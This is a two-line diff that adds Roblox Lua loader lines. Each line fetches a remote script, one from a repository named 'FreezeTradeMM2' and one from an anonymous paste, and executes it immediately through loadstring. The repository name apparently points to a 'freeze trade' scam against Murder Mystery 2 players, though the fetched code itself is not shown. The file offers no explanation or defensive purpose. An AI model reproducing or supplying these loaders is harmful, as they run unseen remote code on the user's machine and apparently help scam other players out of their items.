@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://gitea.com/XenaScripts/FreezeTradeMM2/raw/branch/main/Script.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/QejLbSsX/raw"))()
